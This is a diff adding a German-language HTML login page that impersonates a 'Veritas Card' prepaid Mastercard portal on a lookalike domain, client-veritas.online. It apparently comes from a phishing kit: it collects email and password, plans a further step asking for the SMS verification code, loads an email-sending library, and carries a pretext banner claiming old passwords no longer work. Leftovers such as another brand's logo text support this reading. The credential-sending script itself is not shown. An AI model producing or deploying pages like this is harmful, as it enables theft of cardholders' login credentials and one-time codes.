@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Card Veritas -connessione</title>
+
+<meta name="description" content="Melden Sie sich bei Ihrem Veritas Card-Konto an, um Transaktionen durchzuführen oder Ihren Kontostand abzufragen. Die VERITAS Mastercard-Prepaidkarte bietet Ihnen Zugang zu wichtigen Bankdienstleistungen.">
+
+<meta name="robots" content="index, follow">
+
+<meta name="googlebot" content="index, follow">
+
+<link rel="canonical" href="https://client-veritas.online/">
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="Card Veritas">
+<meta property="og:description" content="Access your Veritas Card account.">
+<meta property="og:url" content="https://client-veritas.online/">
+<meta property="og:site_name" content=" Card veritas">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="style.css">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+<script src="script.js" defer></script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Veritas Card",
+  "url": "https://client-veritas.online/",
+  "description": " Card Veritas."
+}
+</script>
+
+
+</head>
+
+<body>
+<div class="page">
+
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-mark">
+        <img src="logo.png" alt="Logo Vantéo" class="brand-logo-img" onerror="this.style.display='none';">
+      </div>
+    
+    </div>
+    <div class="top-actions">
+      <div class="theme-toggle" id="themeToggle">
+        <span class="dot" id="themeDot"><svg viewBox="0 0 24 24"><path d="M21 12.5A9 9 0 1111.5 3a7 7 0 009.5 9.5z"/></svg></span>
+        <span id="themeLabel">Dunkel</span>
+      </div>
+      <div class="icon-btn" title="Langue">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path stroke-linecap="round" d="M3 12h18M12 3c2.5 2.6 3.8 5.7 3.8 9s-1.3 6.4-3.8 9c-2.5-2.6-3.8-5.7-3.8-9S9.5 5.6 12 3z"/></svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="card">
+      <div class="steps">
+        <span class="active" id="st1"></span><span id="st2"></span><span id="st3"></span>
+      </div>
+
+      
+      <!-- Schritt 1: Anmeldedaten -->
+<div class="step active" id="step1">
+  <h1>**Melden Sie sich bei Ihrem Konto an.**</h1>
+  <p class="subtitle">Geben Sie Ihre Zugangsdaten und anschließend den Bestätigungscode ein, den Sie per SMS oder E-Mail erhalten haben.</p>
+
+<form id="signupForm">
+
+  <div class="field">
+    <label for="email">E-Mail-Adresse</label>
+    <input type="email" id="email" autocomplete="username" required>
+  </div>
+
+  <div class="field">
+    <label for="pwd">Passwort</label>
+    <input type="password" id="pwd" autocomplete="current-password" required>
+  </div>
+
+  <button type="submit" class="btn-signin">Weiter</button>
+  <div id="result"></div>
+
+</form>
+
+  <p class="note">Sie können weiterhin nicht auf Ihre Daten zugreifen? Ihr Aktivierungslink wurde Ihnen nach Ihrer Bestellung per E-Mail zugesandt.</p>
+
+  <div class="banner">
+    Melden Sie sich zum ersten Mal auf der neuen Plattform an? Ihr altes Passwort funktioniert nicht mehr. Klicken Sie auf «Passwort vergessen», um einen 48 Stunden gültigen Aktivierungslink zu erhalten.
+  </div>
+</div>
+      
+    </body>
+    </html>
